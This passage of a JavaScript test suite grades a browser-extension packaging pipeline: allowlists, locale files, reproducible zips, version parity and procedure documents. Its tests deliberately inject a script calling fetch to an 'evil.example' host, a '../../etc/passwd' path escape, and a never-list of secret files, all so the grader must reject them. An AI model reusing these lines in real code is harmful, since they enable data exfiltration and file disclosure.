    /* THE INVARIANT, everywhere: the fleet auditor was inherited. Without it,
       "which of the 67 tools is BEHIND?" has no answer at all.
       The SKELETON additionally has to carry its own changelog, because that is
       what the auditor's BEHIND verdict points a tool author at.
       WHAT THIS DELIBERATELY DOES NOT DO is require CHANGELOG-skeleton.md to be
       ABSENT in a tool. That is a COMPLETENESS fact, it belongs to
       publish/preflight.mjs (which grades it, and which is red by design), and
       asserting it here made the node tier red for the entire middle of the
       procedure: the file is present from the copy until §14, while the tree
       starts answering "I am a tool" at §1. Every ordering of the deletion
       leaves one side red — a check that cannot be green on a correct tool
       mid-build is the shape that teaches an author to delete checks, which is
       how the sink and allowlist checks get lost. A copy test found this; the
       skeleton alone never can, because it is never in that window. */
    check('the fleet auditor was inherited, so a BEHIND verdict is actionable' +
      (isSkeletonTree() ? ' — and the skeleton carries the changelog it points at' : ''),
      H.existsRoot('tools/audit-fleet.mjs') &&
        (!isSkeletonTree() || H.existsRoot('CHANGELOG-skeleton.md')),
      isSkeletonTree()
        ? 'audit-fleet.mjs + CHANGELOG-skeleton.md'
        : 'audit-fleet.mjs kept — preflight owns the deletion of the skeleton\'s own documents');
    check('it compares versions NUMERICALLY — "1.10.0" sorts before "1.9.0" as a string',
      /cmpVersion/.test(H.readRoot('tools/audit-fleet.mjs')) &&
      !/localeCompare|sort\(\)\s*$/.test(stripJsComments(H.readRoot('tools/audit-fleet.mjs'))),
      'the exact bug the reference packaging diff shipped with');
    check('a HANDOFF template exists — decisions are the part that does not retrofit at any price',
      H.existsRoot('HANDOFF.md') && /Teeth/.test(H.readRoot('HANDOFF.md')),
      'five required headings, including Teeth');
    check('none of the provenance files can reach a package',
      ['skeleton.json', 'HANDOFF.md', 'CHANGELOG-skeleton.md', 'tools/audit-fleet.mjs']
        .every(f => PACK.collect().indexOf(f) < 0),
      'skeleton.json · HANDOFF.md · CHANGELOG-skeleton.md · tools/');

    /* A build script that does not parse is a release blocked at 11pm, and the
       failure mode is not hypothetical: bump-version.mjs was written with a
       "*" + "/" quoted inside its own header comment, which closed the comment
       early and made the entire rest of the file parse as code. The CSS token
       block was lost to exactly this once already. `node --check` is the only
       honest test of "it parses". */
    const cp = require('child_process');
    const buildScripts = ['publish/pack.mjs', 'publish/verify-package.node.js', 'publish/bump-version.mjs',
      'publish/preflight.mjs', 'publish/verify-firefox-package.node.js', '_locales/make-locales.mjs',
      '_locales/package-guard.mjs', 'icons/make-icons.mjs', 'publish/shots.mjs', 'tools/audit-fleet.mjs'];
    const unparsable = buildScripts.filter(f => {
      const r = cp.spawnSync(process.execPath, ['--check', path.join(H.ROOT, f)], { encoding: 'utf8' });
      return r.status !== 0;
    });
    check('every build-time script parses (a comment that closes itself early eats the rest of the file)',
      unparsable.length === 0, unparsable.join(', ') || buildScripts.length + ' scripts');

    /* ---- the allowlist ---- */
    const files = PACK.collect();
    check('the allowlist is POSITIVE — it collected the shipped surface and nothing else',
      files.length > 15 && files.indexOf('manifest.json') >= 0 && files.indexOf('background.js') >= 0,
      files.filter(f => f.indexOf('_locales/') !== 0).join(' '));
    const forbidden = files.filter(f => PUB.NEVER.test(f) && !PUB.LEAK_EXEMPT.test(f));
    check('nothing the never-list forbids was collected', forbidden.length === 0, forbidden.join(', ') || 'clean');
    /* The never-list tested DIRECTLY, not through collect(). Defence in depth is
       why removing the `test` clause changes nothing today — no ALLOW rule
       reaches into test/ anyway — and that is exactly why it needs its own
       check: the day someone adds a rule that does, the second line of defence
       has to still be there. (This was a MISSED bite: injecting a test/ rule
       into ALLOW was invisible because NEVER caught it, and weakening NEVER was
       invisible because ALLOW did.) */
    const mustNeverShip = ['test/harness.js', 'test/skeleton-sim.node.js', 'test/browser/smoke.mjs',
      'node_modules/playwright/index.js', 'publish/pack.mjs', 'publish/identity.json',
      'README.md', 'TEMPLATE.md', 'CHANGELOG.md', '.env', '.gitignore', 'secrets.json',
      'icons/make-icons.mjs', 'scratch-DELETE-ME.txt', 'publish/tool-1.0.0.zip',
      /* Fleet provenance and the store assets. Unreachable today by extension
         alone; named here so a widened allowlist rule cannot pick them up. */
      'skeleton.json', 'HANDOFF.md', 'CHANGELOG-skeleton.md', 'tools/audit-fleet.mjs',
      'publish/store/screenshot-1280x800-popup.png', 'publish/shots.mjs'];
    const notForbidden = mustNeverShip.filter(p => !PUB.NEVER.test(p));
    check('the never-list itself forbids every path that must never reach a store',
      notForbidden.length === 0, notForbidden.join(', ') || mustNeverShip.length + ' shapes, all refused');
    const mustBeAllowed = ['manifest.json', 'background.js', 'LICENSE', 'lib/storage.js',
      'pages/options.html', 'popup/popup.css', 'icons/icon128.png'];
    const wronglyForbidden = mustBeAllowed.filter(p => PUB.NEVER.test(p));
    check('and it forbids nothing the extension actually needs',
      wronglyForbidden.length === 0, wronglyForbidden.join(', ') || 'the shipped surface is untouched');
    /* The two lists must not contradict each other. Adding {dir:'test'} to the
       allowlist was a MISSED bite — the never-list caught it, so the tree was
       still correct and nothing went red, which means the day somebody ALSO
       relaxes the never-list there is no warning left. A rule naming a
       forbidden directory is a mistake even when a second guard saves it. */
    const contradictory = PACK.ALLOW.filter(r => r.dir !== '.' && PUB.NEVER.test(r.dir + '/'));
    check('no allowlist rule names a directory the never-list forbids',
      contradictory.length === 0,
      contradictory.map(r => r.dir).join(', ') ||
      PACK.ALLOW.map(r => r.dir).filter((d, i, a) => a.indexOf(d) === i).join(' '));
    for (const trap of ['test/harness.js', 'test/skeleton-sim.node.js', 'TEMPLATE.md', 'README.md',
      'CHANGELOG.md', '.gitignore', 'icons/make-icons.mjs', '_locales/make-locales.mjs',
      'publish/pack.mjs', 'publish/STORE-LISTING.md']) {
      check('it refuses to ship ' + trap, files.indexOf(trap) < 0, 'excluded');
    }
    check('but it DOES ship LICENSE — PolyForm Shield\'s notice travels with every copy',
      files.indexOf('LICENSE') >= 0, 'allowlisted explicitly, so it is a decision and not an accident');

    /* ---- _locales cannot be dropped ---- */
    const always = PACK.localeMessageFiles();
    const viaRules = PACK.localesViaAllowRules();
    check('all 55 locale catalogues are collected', always.length >= 55 && always.every(f => files.indexOf(f) >= 0),
      always.length + ' catalogues');
    check('_locales is reachable by BOTH paths — the allowlist rule and the always-collector',
      viaRules.length === always.length,
      'two independent implementations of one claim; pack.mjs reports any disagreement out loud');
    /* THE UNION, TESTED BY BREAKING THE OTHER PATH. Removing the unconditional
       union was a MISSED bite: while the ALLOW rule works, deleting the union
       changes nothing, so every check was green over a safety net that was no
       longer there. ALLOW is an exported array and arrays are mutable, so the
       sim can delete the _locales rule outright — the strongest possible
       failure of the pattern language — and demand the catalogues anyway. */
    const ruleAt = PACK.ALLOW.findIndex(r => r.dir === '_locales');
    const savedRule = PACK.ALLOW.splice(ruleAt, 1)[0];
    let withoutRule = [];
    try { withoutRule = PACK.collect(); } finally { PACK.ALLOW.splice(ruleAt, 0, savedRule); }
    check('DELETING the _locales allowlist rule entirely still ships all 55 catalogues',
      withoutRule.filter(f => f.indexOf('_locales/') === 0).length === always.length,
      'the union does not go through the pattern language, so no ALLOW/NEVER/depth edit can drop a locale');
    check('and the rule is back where it was, so nothing after this is graded against a mutilated allowlist',
      PACK.ALLOW.length && PACK.ALLOW[ruleAt] === savedRule && PACK.collect().length === files.length,
      files.length + ' files');
    /* The gate is graded with synthetic inputs rather than trusted: this is the
       exact edit — "exclude underscore-prefixed scratch dirs" — that emptied
       _locales from every package in the reference implementation, where the
       compliance document then recorded the omission as a PASSING check. */
    /* Both branches, separately. Asking one question with an either/or regex
       was a MISSED bite: deleting the "dropped catalogues" half left the
       "default locale absent" half to answer, and the check could not tell the
       difference. The two failures are different failures — one is a rejected
       upload, the other is 54 markets silently served English. */
    const noneAtAll = PACK.localeProblems(files.filter(f => f.indexOf('_locales/') !== 0), PACK.readManifests());
    check('the pre-write gate FIRES when the DEFAULT catalogue is dropped — a rejected upload',
      noneAtAll.some(p => /did NOT collect .*_locales\/en\/messages\.json/.test(p)),
      noneAtAll[0] ? noneAtAll[0].slice(0, 110) + '…' : 'IT DID NOT FIRE');
    const defaultOnly = files.filter(f => f.indexOf('_locales/') !== 0 || f.indexOf('_locales/en/') === 0);
    const someDropped = PACK.localeProblems(defaultOnly, PACK.readManifests());
    check('and it FIRES when only the other 54 are dropped — no rejection, just the wrong language',
      someDropped.some(p => /locale file\(s\) on disk were not collected/.test(p)),
      someDropped[0] ? someDropped[0].slice(0, 110) + '…' : 'IT DID NOT FIRE — 54 markets would get English and nothing would say so');
    check('and it passes on the real file set', PACK.localeProblems(files, PACK.readManifests()).length === 0, 'clean');

    /* ---- build a real archive and grade it ---- */
    const out = fs.mkdtempSync(path.join(os.tmpdir(), 'sk-pack-'));
    const zipPath = path.join(out, 'sim-' + JSON.parse(H.readRoot('manifest.json')).version + '.zip');
    PACK.writeZip(zipPath, PACK.buildEntries(files));
    const entries = PUB.readZip(zipPath);
    check('the zip writer produces an archive the reader can walk',
      entries.size === files.length, entries.size + ' entries read back out of ' + files.length + ' written');
    check('manifest.json is at the ROOT of the archive — the most common first-upload failure',
      entries.has('manifest.json'), 'not nested under a folder');
    check('every packaged path is forward-slashed and relative',
      Array.from(entries.keys()).every(k => k.indexOf('\\') < 0 && k.charAt(0) !== '/' && k.indexOf('../') < 0),
      'clean on Windows too');
    const roundTrip = fs.readFileSync(path.join(H.ROOT, 'background.js'));
    check('the bytes survive the deflate/inflate round trip', roundTrip.equals(entries.get('background.js')),
      'background.js is byte-identical inside the archive');
    /* Determinism, asserted at the BYTES rather than by writing twice and
       comparing. Two writes a few microseconds apart are identical even when
       the timestamp comes from the clock, so that comparison was a MISSED bite:
       it passed with `Date.now()` in the header. The local-file-header mod-time
       and mod-date fields (offsets 10 and 12) must be the declared constants. */
    const rawZip = fs.readFileSync(zipPath);
    const hdrTime = rawZip.readUInt16LE(10), hdrDate = rawZip.readUInt16LE(12);
    check('every entry carries a FIXED timestamp, so the build is byte-reproducible',
      hdrTime === 0x0000 && hdrDate === (((2026 - 1980) << 9) | (1 << 5) | 1),
      'mod-time=0x' + hdrTime.toString(16) + ' mod-date=0x' + hdrDate.toString(16) +
      ' — a clock in the header means a rebuild always differs and nothing can be diffed');
    PACK.writeZip(zipPath + '.2', PACK.buildEntries(files));
    check('and two builds of the same tree really are byte-identical',
      fs.readFileSync(zipPath).equals(fs.readFileSync(zipPath + '.2')),
      'a rebuild that differs is a change in the CODE, and can be diffed');

    const graded = PUB.verifyPackage({ zipPath, kind: 'chrome', root: H.ROOT, treeFiles: files });
    const reds = graded.checks.filter(c => !c.ok);
    check('the package grader passes the package the packager just built',
      reds.length === 0, reds.map(r => r.label + ' (' + r.extra + ')').join(' | ') || graded.checks.length + ' checks');

    /* ---- CASE MISMATCH is reported SEPARATELY FROM MISSING ----
       Windows and macOS resolve icons/Icon128.PNG against icons/icon128.png and
       load happily; the reviewer's Linux box 404s. "Not in the package" sends
       the author looking for a file that is right there, so the two answers
       must not share a sentence. */
    const missing = PUB.resolveRef(entries, 'icons/nope.png', 'manifest.json');
    const cased = PUB.resolveRef(entries, 'icons/Icon128.PNG', 'manifest.json');
    const okRef = PUB.resolveRef(entries, 'icons/icon128.png', 'manifest.json');
    check('a reference that resolves is reported as resolving', okRef.ok && okRef.reason === 'OK', okRef.target);
    check('a MISSING reference says MISSING', !missing.ok && missing.reason === 'MISSING', PUB.refExtra(missing));
    check('a CASE MISMATCH is its own answer, and it names the file that IS there',
      !cased.ok && cased.reason === 'CASE MISMATCH' && cased.found === 'icons/icon128.png',
      PUB.refExtra(cased));
    check('a relative reference resolves against the page that made it, not the root',
      PUB.resolveRef(entries, '../pages/common.js', 'popup/popup.html').target === 'pages/common.js',
      'popup/popup.html + ../pages/common.js → pages/common.js');
    check('an http(s) reference is refused outright — it is a network call and a broken promise',
      PUB.resolveRef(entries, 'https://cdn.example/x.js', 'pages/options.html').reason === 'EXTERNAL', 'EXTERNAL');
    check('a reference that escapes the package root is refused',
      PUB.resolveRef(entries, '../../etc/passwd', 'pages/options.html').reason === 'ESCAPES', 'ESCAPES');

    /* ---- the grader BITES: three archives that must be condemned ---- */
    let biteN = 0;
    const biteVer = JSON.parse(H.readRoot('manifest.json')).version;
    const bite = (label, mutate, expect) => {
      /* The name carries the version so the ONLY red is the one being driven —
         a bite whose output is two failures is a bite that could be passing for
         the wrong reason. */
      const p = path.join(out, 'bite' + (++biteN) + '-' + biteVer + '.zip');
      PACK.writeZip(p, mutate(PACK.buildEntries(files)));
      const r = PUB.verifyPackage({ zipPath: p, kind: 'chrome', root: H.ROOT });
      const hit = r.checks.filter(c => !c.ok).map(c => c.label + ' — ' + c.extra).join(' | ');
      check(label, r.fails > 0 && (!expect || new RegExp(expect, 'i').test(hit)),
        r.fails ? hit.slice(0, 150) : 'THE GRADER PASSED IT');
    };
    bite('an archive with everything nested under a folder is condemned',
      es => es.map(e => ({ name: 'My_Tool/' + e.name, data: e.data })), 'nested');
    bite('an archive missing 54 of its 55 locales is condemned',
      es => es.filter(e => e.name.indexOf('_locales/') !== 0 || e.name.indexOf('_locales/en/') === 0), 'SILENTLY DROPPED');
    bite('an archive whose icon differs only in CASE is condemned, as a CASE MISMATCH',
      es => es.map(e => e.name === 'icons/icon128.png' ? { name: 'icons/Icon128.PNG', data: e.data } : e), 'CASE MISMATCH');
    bite('an archive carrying test/ is condemned',
      es => es.concat([{ name: 'test/harness.js', data: Buffer.from('// fixture with an exfil url\n') }]), 'leaked');
    bite('an archive whose background.js lost the importScripts guard is condemned',
      es => es.map(e => e.name === 'background.js'
        ? { name: e.name, data: Buffer.from(String(e.data).replace(/if \(typeof importScripts === 'function'\) \{/, 'if (true) {')) }
        : e), 'UNGUARDED');
    bite('an archive whose script calls fetch() is condemned',
      es => es.concat([{ name: 'pages/evil.js', data: Buffer.from('fetch("https://evil.example/x");\n') }]), 'network');

    try { fs.rmSync(out, { recursive: true, force: true }); } catch (_) {}

    /* ---- version parity, through the real bump-version functions ---- */
    check('every version site agrees — manifest.json, manifest.firefox.json, CHANGELOG.md',
      BUMP.versionProblems().length === 0, BUMP.versionProblems().join(' | ') || 'v' + BUMP.currentVersion());
    check('CHANGELOG.md\'s top entry is the version the tree is at',
      BUMP.changelogTop() === BUMP.currentVersion(),
      BUMP.changelogTop() + ' vs ' + BUMP.currentVersion() + ' — a release nobody documented is a release nobody can explain');
    check('the Firefox add-on id is DERIVED from publish/identity.json, never typed twice',
      BUMP.geckoId() === ((JSON.parse(H.readRoot('publish/manifest.firefox.json')).browser_specific_settings || {}).gecko || {}).id,
      BUMP.geckoId());

    /* ---- the placeholder gate: red here is the CORRECT state ---- */
    const identity = PACK.readIdentity();
    /* The DETECTOR is graded against fixed strings, below and here — never
       against whatever this tree's live identity happens to be. Asserting that
       the live id IS a placeholder is true of the skeleton and false of every
       correctly specialised tool, which is a check that goes red on correct
       code: the one shape this file warns about everywhere else. */
    check('the placeholder detector recognises the id the SKELETON ships',
      PACK.isPlaceholderId('skeleton@REPLACE-WITH-YOUR-DOMAIN.example'),
      'pack.mjs REFUSES to write a Firefox package while this is true, ' +
      'because AMO fixes the add-on identity at first signing');
    /* And the live identity, graded per world: unset in the skeleton, real in
       a tool. Setting it is TEMPLATE §1, the first step of the procedure. */
    check(isSkeletonTree()
      ? 'the skeleton\'s own identity is still the placeholder, so no one can ship it by accident'
      : 'this tool has a REAL add-on identity — AMO fixes it at first signing',
      isSkeletonTree() === PACK.isPlaceholderId(PACK.geckoIdFor(identity)),
      PACK.geckoIdFor(identity));
    check('and it accepts a real one',
      !PACK.isPlaceholderId('my-tool@nikatru.com'), 'my-tool@nikatru.com');
    for (const bad of ['', 'tool@REPLACE-WITH-YOUR-DOMAIN.example', 'tool@example.example']) {
      check('it refuses "' + (bad || '(empty)') + '"', PACK.isPlaceholderId(bad), 'refused');
    }

    /* ---- repo hygiene ---- */
    const licence = H.readRoot('LICENSE');
    check('LICENSE carries the full PolyForm Shield 1.0.0 text, not a reference to it',
      /PolyForm Shield License 1\.0\.0/.test(licence) && /## Noncompete/.test(licence) &&
      /## No Liability/.test(licence) && licence.length > 3000,
      licence.length + ' chars, all 17 sections');
    check('LICENSE carries a Required Notice line — the licence makes it travel with copies',
      /^Required Notice:/m.test(licence), 'the line the Notices section names');
    const gitignore = H.readRoot('.gitignore');
    check('.gitignore keeps node_modules, secrets, OS droppings and scratch out of the repo',
      ['node_modules/', '.env', '*.pem', 'Thumbs.db', '.DS_Store', '*DELETE-ME*', '*.log']
        .every(p => gitignore.indexOf(p) >= 0),
      'and it says out loud that publish/*.zip is tracked ON PURPOSE, as golden masters');
    check('.gitignore does not ignore _locales or publish/*.zip by accident',
      !/^_locales/m.test(gitignore) && !/^publish\/\*\.zip/m.test(gitignore),
      'both are inputs to the package, not build output');

    /* ---- the documents a submission cannot happen without ---- */
    const listingDoc = H.readRoot('publish/STORE-LISTING.md');
    check('STORE-LISTING.md carries a justification block for every permission the §8 table can produce',
      ['activeTab', 'storage', 'downloads', 'scripting', 'unlimitedStorage', 'optional_host_permissions']
        .every(p => new RegExp('^###\\s+Permission:\\s+`' + p + '`\\s*$', 'm').test(listingDoc)),
      'pre-written, so adding a permission is a delete-the-rest job and not a blank page at 11pm');
    check('it states the single-purpose rule and the 132-character cut',
      /single purpose/i.test(listingDoc) && /132/.test(listingDoc) && /Remote code: none/.test(listingDoc),
      'single purpose · summary limit · remote code');
    const comp = H.readRoot('publish/COMPLIANCE-CHECKLIST.md');
    /* Matched on the load-bearing sentence, not on the phrase. "Website
       content" also appears in the AMO paragraph explaining why the two answers
       agree, so testing for the phrase was a MISSED bite: gutting the decision
       table left the explanation behind and the check never noticed. */
    check('COMPLIANCE-CHECKLIST.md pre-answers the privacy-practices question that earns a strike',
      /Disclose \*\*"Website content"\*\*/.test(comp) &&
      /\*\*Not\*\* tick "This item does not collect user data"|Do NOT tick/i.test(comp) &&
      /data_collection_permissions\.required = \["none"\]/.test(comp),
      'Google counts HANDLING, Mozilla counts TRANSMITTING — the two answers are written out as consistent');
    /* The reference's checklist certified "no _* paths in the zip" as PASSING —
       true, and the bug, and a note that would tell the next maintainer that
       fixing it was a regression. This checklist may only mention that rule to
       CORRECT it, so the check asks for the corrected rule and for the
       correction, not for the absence of the words (the words appear here in
       the paragraph explaining the whole problem, which is the point). */
    check('it states the corrected locale rule rather than the reference\'s certified bug',
      /\*\*must ship\*\*/.test(comp) &&
      /Every other underscore-prefixed path\s+must not/.test(comp) &&
      /was the bug/.test(comp),
      '"_locales/ MUST ship — all of it. Every other underscore path must not."');
    check('SUBMISSION.md lists only what a human must do, and names the hosted-policy blocker',
      /only the things a human must do/i.test(H.readRoot('publish/SUBMISSION.md')) &&
      /no publish button without it/i.test(H.readRoot('publish/SUBMISSION.md')),
      'the machine half is the six commands at the top');
  });

  /* ================================================================== */
  /* template — the document 67 agents execute                           */
  /* ================================================================== */
  /* TEMPLATE.md is not documentation, it is a PROCEDURE, run 67 times, mostly
     by an agent, mostly with nobody reading the output. Ambiguity in it is a
     defect that repeats 67 times, and the specific way it rots is silent: it
     names a file and a string to find, the code moves, and the instruction
     now sends its reader looking for something that is not there.

     That is not hypothetical. Before this section existed, §1 told every agent
     to open manifest.json and replace `"name": "SKELETON — replace me"` — a
     string that stopped being in manifest.json the day i18n landed and moved
     into _locales/en/messages.json. Four rows of the identity table pointed at
     nothing, and there was nothing to notice.

     So every anchor the document names is checked against the tree. */
  await runSection('template', async () => {
    if (!H.existsRoot('TEMPLATE.md')) {
      /* A finished tool deletes it — §14's last step, and preflight checks it.
         Its absence is correct there and must not be a red. */
      check('TEMPLATE.md is absent, which is what a finished tool looks like',
        true, 'nothing to grade');
      return;
    }
    const T = H.readRoot('TEMPLATE.md');
    const en = JSON.parse(H.readRoot('_locales/en/messages.json'));

    /* ---- the two LOCKED OWNER RULES must be present and unmissable ---- */
    check('LOCKED RULE 1 is stated, under its own heading: functional output is never translated',
      /LOCKED RULE — the tool's functional output is never translated/.test(T),
      '§2c');
    check('and it says WHICH output, concretely enough to act on',
      ['CSV header', 'Captured page text', 'Filenames', 'JSON keys']
        .every(s => new RegExp(s, 'i').test(T)),
      'exported Markdown/JSON/CSV, captured page text, filenames, version strings');
    check('and it gives the REASON, so it is not a rule to be reasoned around',
      /does not sort/.test(T) && /٢٠٢٦/.test(T),
      'a folder of localised dates does not sort; a CSV header is parsed by a spreadsheet');

    check('LOCKED RULE 2 is stated, under its own heading: a secrets file is never committed',
      /LOCKED RULE — a secrets file is never committed/.test(T), '§12');
    check('and it says an ignored file is NOT a protected file',
      /one `git add -f`\s*\n?\s*from being public/.test(T.replace(/\s+/g, ' ')) ||
      /one `git add -f` from being public/.test(T.replace(/\s+/g, ' ')),
      'the .gitignore is a safety net, not permission');
    check('and the packaging never-list actually enforces the shapes it names',
      ['.env', 'secrets.json', 'credentials.json', 'x.pem', 'y.key', 'z.p12', 'w.pfx']
        .every(p => PUB.NEVER.test(p)),
      'all seven shapes refused by publish/verify-package.node.js NEVER');

    /* ---- every anchor the document names must exist ---- */
    /* Message keys in the §2b identity table. This is the exact rot that made
       §1 unfollowable, so it is the check that matters most here. */
    const keyRows = T.match(/^\| 2\.\d+ \| ([^|]+) \|/gm) || [];
    const namedKeys = [];
    for (const row of keyRows) {
      for (const m of row.matchAll(/`([A-Za-z][A-Za-z0-9_]*)`/g)) namedKeys.push(m[1]);
    }
    const strayKeys = namedKeys.filter(k => !(k in en));
    check(namedKeys.length + ' message keys named in the identity table all exist in _locales/en',
      namedKeys.length >= 8 && strayKeys.length === 0,
      strayKeys.length ? 'NOT IN THE CATALOGUE: ' + strayKeys.join(', ') : namedKeys.join(' '));

    /* Every PLACEHOLDER tag in shipped source must be findable in the document,
       and every tag the document names must exist in the source. Either
       direction failing is an edit point somebody silently skips. */
    const inCode = new Set();
    for (const [, src] of H.readShipped(['.js', '.css', '.html'])) {
      for (const m of (src.match(/PLACEHOLDER\(([a-z-]+)\)/g) || [])) inCode.add(m.slice(12, -1));
    }
    for (const f of ['icons/make-icons.mjs', 'publish/shots.mjs']) {
      for (const m of (H.readRoot(f).match(/PLACEHOLDER\(([a-z-]+)\)/g) || [])) inCode.add(m.slice(12, -1));
    }
    const inDoc = new Set();
    for (const m of T.matchAll(/PLACEHOLDER\(([a-z-]+)\)/g)) inDoc.add(m[1]);
    const undocumented = [...inCode].filter(t => !inDoc.has(t)).sort();
    const phantom = [...inDoc].filter(t => !inCode.has(t)).sort();
    check('every PLACEHOLDER( in the code is explained somewhere in TEMPLATE.md',
      undocumented.length === 0,
      undocumented.length ? 'NOT EXPLAINED: ' + undocumented.join(' ') : inCode.size + ' tags, all documented');
    check('and every tag TEMPLATE.md names still exists in the code',
      phantom.length === 0,
      phantom.length ? 'NAMED BUT GONE: ' + phantom.join(' ') : inDoc.size + ' tags, all real');

    /* Every file path the document points at. A path that has moved is the
       same defect as a string that has moved. */
    const paths = new Set();
    for (const m of T.matchAll(/`((?:[a-z_][\w.-]*\/)+[\w.-]+\.(?:js|mjs|css|html|json|md))`/g)) paths.add(m[1]);
    for (const m of T.matchAll(/`(manifest\.json|LICENSE|CHANGELOG\.md|CHANGELOG-skeleton\.md|skeleton\.json|HANDOFF\.md|README\.md|TEMPLATE\.md|\.gitignore)`/g)) paths.add(m[1]);
    /* Files the document names *in order to tell you to delete them*. Once you
       have followed that instruction they are correctly absent, so requiring
       them would make obeying the procedure turn the tier red. In the skeleton
       they must all still be here. */
    const DELETED_BY_PROCEDURE = new Set(['CHANGELOG-skeleton.md', 'TEMPLATE.md']);
    const missingPaths = [...paths].filter(p =>
      !H.existsRoot(p) &&
      // Paths the document names as things you CREATE or as examples.
      !/^Tools\//.test(p) && p !== 'pages/options.css.js' &&
      !(!isSkeletonTree() && DELETED_BY_PROCEDURE.has(p)));
    check(paths.size + ' file paths named in TEMPLATE.md all exist',
      missingPaths.length === 0,
      missingPaths.length ? 'NOT ON DISK: ' + missingPaths.join(', ') : 'every path resolves');

    /* Every command the document tells you to run must at least parse and be
       a real file. A procedure whose commands do not exist is worse than none. */
    const cmds = [...T.matchAll(/^\s*node ((?:[\w.-]+\/)*[\w.-]+\.(?:mjs|js))/gm)].map(m => m[1]);
    const uniqueCmds = [...new Set(cmds)];
    const badCmds = uniqueCmds.filter(c => !H.existsRoot(c));
    check(uniqueCmds.length + ' distinct `node …` commands in TEMPLATE.md all name a real script',
      uniqueCmds.length >= 8 && badCmds.length === 0,
      badCmds.length ? 'NO SUCH SCRIPT: ' + badCmds.join(', ') : uniqueCmds.join(' · '));

    /* ---- the document must not contain a count that goes stale ---- */
    /* "In _skeleton it prints fourteen" was true when it was written and wrong
       three commits later, and a reader who checks it and finds fifteen learns
       that the document is approximately right — which is the training that
       makes every other line in it negotiable. */
    check('TEMPLATE.md quotes no preflight count in prose — the script prints the number',
      !/prints (fourteen|fifteen|sixteen|seventeen|eighteen|nineteen|twenty|\d+) outstanding/i.test(T) &&
      !/it prints (fourteen|fifteen|sixteen|seventeen|eighteen|nineteen|twenty)\b/i.test(T),
      'counts in prose go stale; the script does not');

    /* ---- the structure a reader depends on ---- */
    const sections = (T.match(/^## \d+[a-z]?\. /gm) || []).length;
    check('the document is a numbered procedure, top to bottom',
      sections >= 12, sections + ' numbered sections');
    check('§0 comes before every edit, and says how to copy and stamp the folder',
      /^## 0\. Before the first edit/m.test(T) && /skeleton\.json/.test(T.slice(0, T.indexOf('## 1.'))),
      'copy · stamp skeleton.json · keep the skeleton\'s files until §1 · the three commands');
    check('it warns against a blanket sed BEFORE the section full of renames',
      T.indexOf('blanket `sed`') > 0 && T.indexOf('blanket `sed`') < T.indexOf('## 3. The code prefix'),
      'SKIP_DIRS -> MTIP_DIRS is the worked example');
    /* Graded on SUBSTANCE — all three files named in the last step — rather
       than on one exact sentence, which is a check that breaks when the prose
       improves and teaches the author to revert the improvement.
       CHANGELOG-skeleton.md is named HERE and nowhere earlier on purpose: it is
       what the node tier reads as "this is still the skeleton" until §1 sets
       the slug, so an author told to delete it at §0 goes red for obeying. */
    {
      const last = T.slice(T.lastIndexOf('### Last step'));
      const named = ['TEMPLATE.md', 'CHANGELOG-skeleton.md', 'README.md']
        .filter(f => last.includes('`' + f + '`'));
      check('the last step tells you to delete the skeleton\'s own documents and rewrite README.md',
        named.length === 3 && /§0 says why|not first/.test(last),
        named.join(' · ') + ' — and it says to do it LAST, after §1 sets the identity');
    }
    check('it names the three commands that are RED by design, so a red is not a mystery',
      /RED in `_skeleton` itself, and that is correct/.test(T) &&
      /submission gates, not\s*\n?test tiers/.test(T.replace(/\*\*/g, '')),
      'preflight · pack (firefox half) · verify-firefox-package');
    check('it tells a tool author which sim sections are fixtures and which are house rules',
      /Rewrite freely \| Keep/.test(T) && /as collateral/.test(T),
      '§11 — deleting a red check is how the sink and allowlist checks get lost');
  });

  finish();
})().catch(e => {
  console.error(e && e.stack || e);
  console.log('\nFAILURES: 1');
  process.exit(1);
});
